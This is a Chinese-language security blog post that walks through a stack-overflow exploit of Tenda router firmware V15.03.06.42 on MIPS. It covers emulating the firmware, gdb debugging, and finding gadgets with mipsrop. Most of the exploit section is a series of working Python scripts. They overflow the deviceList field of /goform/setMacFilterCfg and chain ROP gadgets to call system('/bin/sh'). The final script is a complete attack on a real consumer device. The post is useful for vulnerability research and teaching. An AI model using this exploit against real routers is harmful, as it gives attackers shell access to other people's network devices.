# 对tenda(V15.03.06.42_mips)进行getshell

阅读量 **171058**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-19 17:30:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01f1bd4b03753b7c71.jpg)

第一次对mips架构的路由器进行分析，整体来说和arm架构的差不多，但是rop利用起来要更加繁琐一点，需要利用到的软件有ida的插件mipsrop。

## mips架构简介

###  寄存器

寄存器 | 名字 | 用法  
---|---|---  
$0 | $zero | 常量0(constant value 0)  
$1 | $at | 保留给汇编器(Reserved for assembler)  
$2-$3 | $v0-$v1 | 函数调用返回值(values for results and expression evaluation)  
$4-$7 | $a0-$a3 | 函数调用参数(arguments)  
$8-$15 | $t0-$t7 | 暂时的(或随便用的)  
$16-$23 | $s0-$s7 | 保存的(或如果用，需要SAVE/RESTORE的)(saved)  
$24-$25 | $t8-$t9 | 暂时的(或随便用的)  
$28 | $gp | 全局指针(Global Pointer)  
$29 | $sp | 堆栈指针(Stack Pointer)  
$30 | $fp | 帧指针(Frame Pointer)  
$31 | $ra | 返回地址(return address)  
  
以上即为在mips架构中用到的寄存器以及寄存器的作用。这边重点讲一下$ra、$a0这两个寄存器，因为$ra寄存器为函数的返回地址，进行栈溢出时需要对函数返回地址进行覆盖；$a0这个寄存器存放的数据为函数的第一个参数，例如在函数system(“/bin/sh”)中，$a0寄存器存放的值即为”/bin/sh”，这给我们在gadget构造中具有指向作用。

## 固件分析

###  程序patch

和所有的tenda固件一样，该固件也需要进行patch以便运行，首先找到main函数：

![](https://p5.ssl.qhimg.com/t01980e9fe6f2d5e60e.png)

与arm架构不同的是这里一共有三处需要进行patch，为了更好地讲解，tab查看伪代码：

![](https://p3.ssl.qhimg.com/t013e66aa0fa9b52a82.png)

这边一共有三处if语句，都必须符合才可以让程序跑起来，具体patch完的程序如下：

![](https://p1.ssl.qhimg.com/t010336a16ceaebd742.png)

开始运行之前需要在将qemu-mipsel-static复制到固件模拟根目录下，运行命令：

    
    
    cp $(which qemu-mipsel-static) .
    sudo chroot ./ ./qemu-mipsel-static ./bin/httpd
    

![](https://p4.ssl.qhimg.com/t01cafb2d1add6be767.png)

这里两处提示无法创建文件，查看proc目录下，发现为空，根据提示创建文件即可，创建完文件夹之后，再次运行，发现可以正常运行：

![](https://p5.ssl.qhimg.com/t014b28e94894fbc3a2.png)

###  漏洞函数分析

直接贴出漏洞存在的函数，采用倒序分析法进行分析：

![](https://p3.ssl.qhimg.com/t016d68e053e7d6d6c3.png)

由于在这strcpy函数中，并未对字符串进行检查，可以导致栈溢出，具体的漏洞分析方法，参考该文章：

<https://serverless-page-bucket-06marb3t-1307447010.cos-website.ap-hongkong.myqcloud.com/2021/09/22/tenda%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84getshll/#more>

###  漏洞触发

这一步原以为和arm架构的一样时，出现了问题，贴出我第一次用于触发漏洞的poc：

    
    
    import requests
    from pwn import *
    
    url = "http://192.168.5.6/goform/setMacFilterCfg"
    cookie = {"Cookie":"password=12345"}
    data = {"macFilterType": "white", "deviceList":"\r" +  "A" * 500}
    requests.post(url, cookies=cookie, data=data)
    

然后使用gdb-multiarch进行调试：

![](https://p3.ssl.qhimg.com/t01f6e78c84f6ac1179.png)

发现程序并没有按照预期那样的被“AAAA”覆盖掉了返回地址，而是跑到了strlen函数中，最终停了下来，这是个非预期的错误，所以果断开始进行动态调试。在动态调试之前介绍一下strcpy这个函数的特点，这个函数的特点就是在遇到”\x00”会被截断，所以在构造payload的时候一定要注意payload中绝不可以有”\x00”这一字节。

在动态调试之前先进行静态分析一下：

![](https://p4.ssl.qhimg.com/t012f7cde79e5d691d2.png)

这边对栈溢出字符以及存放栈溢出字符串的地址进行了加载，调试的重点就是进入strcpy函数查看存放栈溢出字符串的地址里的内容：

![](https://p1.ssl.qhimg.com/t01c93509020da5027c.png)

在jalr处下断点，运行：

![](https://p0.ssl.qhimg.com/t01d39d8e9bc97c5633.png)

然后输入si命令，进入到strcpy函数中，disassemble命令查看该段汇编指令：

![](https://p5.ssl.qhimg.com/t0198121305c39e86aa.png)

关键函数在于这三行：

    
    
    0x7f561230 <+16>:    lbu    a0,0(a1)
    0x7f561234 <+20>:    addiu    a1,a1,1
    0x7f561238 <+24>:    bnez    a0,0x7f56122c <strcpy+12>
    

这三行进行了copy的操作，断点下在0x7f561238：

![](https://p1.ssl.qhimg.com/t0130b3db44b18a7a55.png)

继续运行：

![](https://p3.ssl.qhimg.com/t01fe24b0b537401427.png)

这样就完成了对第一个字符的strcpy，输入命令si，继续运行：

![](https://p3.ssl.qhimg.com/t013ec6f32e517c6e3d.png)

发现这边是将溢出字符放入到了$v1中，通过”x/x $v1”命令查看内存中的内容：

![](https://p1.ssl.qhimg.com/t01127a4dee5c3c2051.png)

发现已经成功复制进去了第一个字符，通过”x/160wx $v1”命令查看内存中更多的内容：

![](https://p5.ssl.qhimg.com/t01b958ecbcf09ae62e.png)

由于$v1寄存器的值会加一，所以这里设置一个base地址：

    
    
    set $base = $v1
    

这样就可以通过命令”x/160wx $base”查看内存中的内容：

![](https://p1.ssl.qhimg.com/t014d75e044b63f6a70.png)

通过观察$base中的地址，在这个地方发现了return地址：

![](https://p0.ssl.qhimg.com/t01662672d56852c541.png)

这个其实就是pwn3的地址，如果这里有不理解的话，可以进行静态调试，打开pwn3函数：

![](https://p2.ssl.qhimg.com/t01e312231ec48c9a44.png)

在pwn3函数中引用了pwn2函数，在pwn2函数中又引用了pwn1函数，在pwn1函数执行完之后会重新跳转到pwn2函数中，执行完之后又会继续跳转到pwn3函数中，所以这里保存了要继续跳转到pwn3中的地址，查看汇编后发现，的确如此，保存的地址为调用pwn2之后的第二句汇编指令的地址（因为第一句是nop）：

![](https://p4.ssl.qhimg.com/t01eb7bee02fa603716.png)

至此，找到了溢出的大小：0x7ffff0cc – 0x7fffeef4 = 0x1d8 = 472。

验证溢出字符长度，修改poc为：

    
    
    import requests
    from pwn import *
    
    url = "http://192.168.5.6/goform/setMacFilterCfg"
    cookie = {"Cookie":"password=12345"}
    data = {"macFilterType": "white", "deviceList":"\r" +  "A" * 472 + "BBBB"}
    requests.post(url, cookies=cookie, data=data)
    

再次发送poc：

![](https://p4.ssl.qhimg.com/t011c051bb328e28cae.png)

符合poc中”BBBB”，说明覆盖返回地址成功。这里埋下一个伏笔，暂时就为什么多覆盖之后会报错卖个关子。

###  gadget利用思路

在讲解mips
gadget之前，一定要介绍一款插件，就是ida的mipsrop，这款可以很好地寻找mips中的gadget，ROPgadget对于mips来说支持度不是特别高。这里就mipsrop如何安装不做过多的赘述。

在通过mipsrop寻找gadget之前，介绍几个常见的gadget，在libc中，scandir和scandir64函数的末尾有大量的lw处理：

![](https://p4.ssl.qhimg.com/t01c86b6030199562af.png)

这个gadget的好处在于可以控制$ra，这样就可以控制跳转函数了，这里的利用思路为，将$ra覆盖为第二个gadget，在$sXX寄存中分别覆盖system地址和binsh的地址，然后跳转至gadget2中，将binsh的地址传给$a0，随后跳转至system函数，即可完成getshell。这里，我们确定一个传参给$a0的寄存器，我选择的是$s1，则直接搜索：

    
    
    Python>mipsrop.find("move $a0 $s1")
    --------------------------------------------------------------    |  Address     |  Action         |  Control Jump             |
    --------------------------------------------------------------    |  0x0000AB9C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0000ABA4  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0000F54C  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00011ABC  |  move $a0,$s1   |  jalr  $s4                |
    |  0x0001822C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00018234  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000183B8  |  move $a0,$s1   |  jalr  $s3                |
    |  0x000183C0  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00019080  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00019088  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0001920C  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00019214  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0001C48C  |  move $a0,$s1   |  jalr  $s5                |
    |  0x0001C4B8  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00022690  |  move $a0,$s1   |  jalr  $a2                |
    |  0x0002605C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0002A868  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0002D4EC  |  move $a0,$s1   |  jalr  $s6                |
    |  0x0002D9B0  |  move $a0,$s1   |  jalr  $s6                |
    |  0x0002E510  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0002FB28  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0002FB68  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00031EA4  |  move $a0,$s1   |  jalr  $s0                |
    |  0x0003751C  |  move $a0,$s1   |  jalr  $s4                |
    |  0x00037608  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00037628  |  move $a0,$s1   |  jalr  $s5                |
    |  0x000376BC  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00037700  |  move $a0,$s1   |  jalr  $fp                |
    |  0x0003787C  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00037964  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00037A2C  |  move $a0,$s1   |  jalr  $s5                |
    |  0x0003E8F8  |  move $a0,$s1   |  jalr  $s4                |
    |  0x0003E918  |  move $a0,$s1   |  jalr  $s3                |
    |  0x0003FE24  |  move $a0,$s1   |  jalr  $s4                |
    |  0x0003FE44  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00040A08  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00040D90  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00040DA4  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00043BFC  |  move $a0,$s1   |  jalr  $s7                |
    |  0x00043C10  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00043C4C  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00043C68  |  move $a0,$s1   |  jalr  $s5                |
    |  0x000448CC  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00045C6C  |  move $a0,$s1   |  jalr  $s7                |
    |  0x00045E68  |  move $a0,$s1   |  jalr  $fp                |
    |  0x00046514  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046550  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046578  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046590  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000465A8  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000465C4  |  move $a0,$s1   |  jalr  $s2                |
    |  0x000465DC  |  move $a0,$s1   |  jr    $s2                |
    |  0x00046830  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046848  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046860  |  move $a0,$s1   |  jr    $s2                |
    |  0x00046900  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046B24  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046B3C  |  move $a0,$s1   |  jr    $s2                |
    |  0x000479AC  |  move $a0,$s1   |  jalr  $fp                |
    |  0x00048C60  |  move $a0,$s1   |  jr    $s0                |
    |  0x0004AF48  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0004CD78  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00052670  |  move $a0,$s1   |  jalr  $s5                |
    |  0x000532D8  |  move $a0,$s1   |  jalr  $s3                |
    |  0x000554C4  |  move $a0,$s1   |  jalr  $s4                |
    |  0x00055DC0  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00055E20  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00056068  |  move $a0,$s1   |  jalr  $s0                |
    |  0x0005D670  |  move $a0,$s1   |  jalr  $s6                |
    |  0x0005D700  |  move $a0,$s1   |  jalr  $s7                |
    |  0x0005D8C0  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00013B68  |  move $a0,$s1   |  jr    0x24+var_s10($sp)  |
    |  0x00022600  |  move $a0,$s1   |  jr    0x24+var_s8($sp)   |
    |  0x0002DA44  |  move $a0,$s1   |  jr    0xA8+var_s24($sp)  |
    |  0x00031ECC  |  move $a0,$s1   |  jr    0x30+var_s14($sp)  |
    |  0x00040DE0  |  move $a0,$s1   |  jr    0x30+var_sC($sp)   |
    |  0x000415E0  |  move $a0,$s1   |  jr    0x30+var_s14($sp)  |
    |  0x000430EC  |  move $a0,$s1   |  jr    0x60+var_s24($sp)  |
    |  0x0004DCB8  |  move $a0,$s1   |  jr    0x58+var_s24($sp)  |
    |  0x00059FA0  |  move $a0,$s1   |  jr    0x24+var_s18($sp)  |
    |  0x0005D72C  |  move $a0,$s1   |  jr    0x20+var_s24($sp)  |
    --------------------------------------------------------------    

这边我选择了第一个作为gadget2，也就是为自己买下了第二个坑，具体为什么坑，后面执行exp的时候再说。gadget2的内容为：

    
    
    .text:0000ABA4                 move    $a0, $s1
    .text:0000ABA8                 move    $t9, $s2
    .text:0000ABAC                 jalr    $t9 ; sub_10DB0
    

首先我们将exp写到覆盖到gadget1（scandir64）的地址：

    
    
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    
    libc = ELF("libc.so.0")
    
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    
    try:
        getshell()
    except:
        print("Wrong.")
    

进行动态调试，断点下载rop1处（0x7f524000+0x13444）查看是否成功跳转：

![](https://p2.ssl.qhimg.com/t011c0468d658f65d7c.png)

发现成功跳转到了scandir64函数处，disassemble命令查看全部汇编指令，取出其中重要部分：

    
    
    0x7f537444 <+484>:    lw    ra,68(sp)
    0x7f537448 <+488>:    lw    s8,64(sp)
    0x7f53744c <+492>:    lw    s7,60(sp)
    0x7f537450 <+496>:    lw    s6,56(sp)
    0x7f537454 <+500>:    lw    s5,52(sp)
    0x7f537458 <+504>:    lw    s4,48(sp)
    0x7f53745c <+508>:    lw    s3,44(sp)
    0x7f537460 <+512>:    lw    s2,40(sp)
    0x7f537464 <+516>:    lw    s1,36(sp)
    0x7f537468 <+520>:    lw    s0,32(sp)
    0x7f53746c <+524>:    jr    ra
    

这里发现移动至寄存器中的sp均有偏移，分别为68、64……36、32，通过”x/x $sp + 68”命令查看内存中的值：

![](https://p5.ssl.qhimg.com/t0103b0229a25d4b2fc.png)

目前这里是0，那么如果继续循行程序会将0传给$ra:

![](https://p4.ssl.qhimg.com/t01705a83daeb21c708.png)

发现传参成功，同理后续步骤会对$sXX寄存器进行赋值，有了这些信息之后，需要进行构建payload，需要覆盖到目标地址内容，但是注意，栈存储的顺序是倒序，所以需要先覆盖到$sp+32处，依次放入$s0、$s1、$s2、$s3、$s4、$s5、$s6、$s7、$s8、$ra应该存放的值，然而因为我利用的gadget2  
的特殊性，所以要将$s1中放”/bin/sh”的地址，$s2中放system函数的地址。又因为在执行了跳转之后，sp指向的即为存放返回地址的下一个地址，所以只需要在payload中继续存放32个A即可，修改exp为：

    
    
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    
    libc = ELF("libc.so.0")
    
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += "A" * 32
        payload += "B" * 4                                          #$s0
        payload += p32(libc_base + next(libc.search("/bin/sh")))    #$s1
        payload += p32(libc_base + sys_off)                         #$s2
        payload += 'B' * 4                                          #$s3
        payload += 'B' * 4                                          #$s4
        payload += 'B' * 4                                          #$s5
        payload += 'B' * 4                                          #$s6
        payload += 'B' * 4                                          #$s7
        payload += "B" * 4                                          #$fp
        payload += p32(libc_base + rop2)                            #$ra
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    
    try:
        getshell()
    except:
        print("Wrong.")
    

还是选择将断点下在了rop1处，进行动态调试：

![](https://p3.ssl.qhimg.com/t018e1103a5f43e42e1.png)

又发生了非预期的错误，但是仔细一看，是不是觉得这个错误很眼熟？这个错误就是在一开始我们在进行栈溢出偏移量覆盖是第一次出现的错误（覆盖”A” *
500），又停在了这边，那肯定是在覆盖时，覆盖了一些此前存在栈中的数据，导致了栈帧不平衡，开始继续动态调试寻找问题，在寻找问题之前首先分析一下可能出错的位置，首先之前在对返回地址进行覆盖之后是没有任何问题的，所以排除了在返回地址之前非法覆盖导致栈帧不平衡的问题，那么问题肯定是出现在了返回地址之后，一个地址一个地址进行排查，修改exp为：

    
    
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    
    libc = ELF("libc.so.0")
    
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += "A" * 4 * 1                    
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    
    try:
        getshell()
    except:
        print("Wrong.")
    

进行调试：

![](https://p4.ssl.qhimg.com/t014095cfca9498c4ff.png)

发现覆盖第一个地址之后，就报错了，看来第一个地址不可以覆盖，再看看报错的原因：

![](https://p2.ssl.qhimg.com/t01937019a165376423.png)

发现这一步是对将$v0中的内容进行传参，但是$v0的地址已经被覆盖成了非法的地址，所以这里就报错了，那么我们将这里覆盖一个合法的栈地址，由于程序没有开aslr，那么就直接将溢出字符串的初始地址作为参数进行传递，修改exp为：

    
    
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    
    libc = ELF("libc.so.0")
    
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 4 * 1                    
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    
    try:
        getshell()
    except:
        print("Wrong.")
    

再次运行得到：

![](https://p3.ssl.qhimg.com/t011bca3946b27d4b37.png)

到这里之后，不要慌，这里应该是gdb的一个bug，一开始我以为也是出现了另一个问题，因为没有成功跳转到rop1，不过我在进行调试的时候发现，这时候只需要在rop1的地址加上2就可以在gdb中正常进行，修改exp为：

    
    
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    
    libc = ELF("libc.so.0")
    
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13446
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 4 * 7                   
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    
    try:
        getshell()
    except:
        print("Wrong.")
    

动态调试：

![](https://p2.ssl.qhimg.com/t014592fe15544a10f6.png)

发现在gdb中可以正常运行至rop1处，那看到这里，可能会很疑惑，到底是看哪个地址呢？在gdb中运用disassemble命令查看该块的汇编指令，发现此时在汇编指令中，并没有箭头指向：

![](https://p4.ssl.qhimg.com/t01b46039b3b9eb86c6.png)

所以我们应该以第一次的地址为准也就是rop1=0x13444。第一次出错可能是gdb的小bug，但是这里既然可以跳转至rop1了，说明栈帧都是平衡了，可以进行rop操作了，修改exp为：

    
    
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    
    libc = ELF("libc.so.0")
    
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 28
        payload += "B" * 4                                          #$s0
        payload += p32(libc_base + next(libc.search("/bin/sh")))    #$s1
        payload += p32(libc_base + sys_off)                         #$s2
        payload += 'B' * 4                                          #$s3
        payload += 'B' * 4                                          #$s4
        payload += 'B' * 4                                          #$s5
        payload += 'B' * 4                                          #$s6
        payload += 'B' * 4                                          #$s7
        payload += "B" * 4                                          #$fp
        payload += p32(libc_base + rop2)                            #$ra   
        url = "http://192.168.5.4/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}
        requests.post(url, cookies=cookie, data=data)
    
    try:
        getshell()
    except:
        print("Wrong.")
    

最终执行，断点依旧下载rop1处：

![](https://p4.ssl.qhimg.com/t0142f574b63c46fbdc.png)

rop1处寄存器都成功被覆盖，继续步入rop2中：

![](https://p0.ssl.qhimg.com/t01267d538420810640.png)

发现rop2处的地址也覆盖得非常成功，继续si步入system函数：

![](https://p5.ssl.qhimg.com/t01f259d94d5d716d19.png)

但是si一进去，就意识到了事情不对劲，$a0也变了，这样就不能执行system(“/bin/sh”)，具体为什么$a0会发生改变，这个我也不是很清楚，随后我更换了gadget2的跳转指令为jr的，即：

    
    
    .text:00046860                 move    $a0, $s1
    .text:00046864                 addiu   $a1, $s0, 0x10
    .text:00046868                 move    $t9, $s2
    .text:0004686C                 lw      $ra, 0x18+var_sC($sp)
    .text:00046870                 lw      $s2, 0x18+var_s8($sp)
    .text:00046874                 lw      $s1, 0x18+var_s4($sp)
    .text:00046878                 lw      $s0, 0x18+var_s0($sp)
    .text:0004687C                 jr      $t9 ; xdr_u_long
    

万幸的是这个gadget2不需要对gadget1进行修改，直接跳转就行，修改exp为：

    
    
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    
    libc = ELF("libc.so.0")
    
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0x46860
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += p32(0x7fffeef4)
        payload += "A" * 28
        payload += "B" * 4                                          #$s0
        payload += p32(libc_base + next(libc.search("/bin/sh")))    #$s1
        payload += p32(libc_base + sys_off)                         #$s2
        payload += 'B' * 4                                          #$s3
        payload += 'B' * 4                                          #$s4
        payload += 'B' * 4                                          #$s5
        payload += 'B' * 4                                          #$s6
        payload += 'B' * 4                                          #$s7
        payload += "B" * 4                                          #$fp
        payload += p32(libc_base + rop2)                            #$ra   
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}
        requests.post(url, cookies=cookie, data=data)
    
    try:
        getshell()
    except:
        print("Wrong.")
    

修改完之后，继续进行动态调试，断点下载rop2处：

![](https://p1.ssl.qhimg.com/t0133a7884c1bd7db8a.png)

单步si调试至跳转处，发现程序一切正常：

![](https://p0.ssl.qhimg.com/t01a4311d564bb3f73c.png)

进入跳转：

![](https://p0.ssl.qhimg.com/t01802a05340a6306d5.png)

看到这里，长吁一口气，大功告成，自信地按下c：

![](https://p2.ssl.qhimg.com/t015668e3b6777b8cbb.png)

getshell成功！

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ZhouYetao** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254426](/post/id/254426)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [IoT](/tag/IoT)
  * [Pwn](/tag/Pwn)

 **+1** __9赞

 __收藏

![](https://p1.ssl.qhimg.com/t01b3173177e116d249.png) ZhouYetao

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

